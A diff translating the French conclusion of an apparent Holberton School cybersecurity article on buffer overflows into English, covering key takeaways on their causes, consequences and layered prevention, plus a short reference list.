-**Points clés à retenir :**
+**Key points to remember:**
 
-1. **Un buffer overflow** se produit quand un programme écrit au-delà des limites d'un tampon mémoire
-2. **Les conséquences** peuvent aller du simple crash à la prise de contrôle totale du système
-3. **La prévention** nécessite une approche multicouche : programmation sécurisée, protections du compilateur, et protections système
-4. **Les langages modernes** comme Rust offrent une protection native contre ces vulnérabilités
+1. **A buffer overflow** occurs when a program writes beyond the limits of a memory buffer
+2. **The consequences** can range from a simple crash to complete system takeover
+3. **Prevention** requires a multi-layered approach: secure programming, compiler protections, and system protections
+4. **Modern languages** like Rust offer native protection against these vulnerabilities
 
-La meilleure défense reste la **sensibilisation des développeurs** et l'adoption de pratiques de programmation sécurisée dès le début du cycle de développement.
+The best defense remains **developer awareness** and the adoption of secure programming practices from the beginning of the development cycle.
 
 ---
 
-## Références
+## References
 
 - CERT/CC - Computer Emergency Response Team
 - CVE (Common Vulnerabilities and Exposures) Database
@@ -592,4 +592,4 @@ La meilleure défense reste la **sensibilisation des développeurs** et l'adopti
 
 ---
 
-*Article rédigé dans le cadre du projet Holberton School - Cybersécurité*
+*Article written as part of the Holberton School - Cybersecurity project*
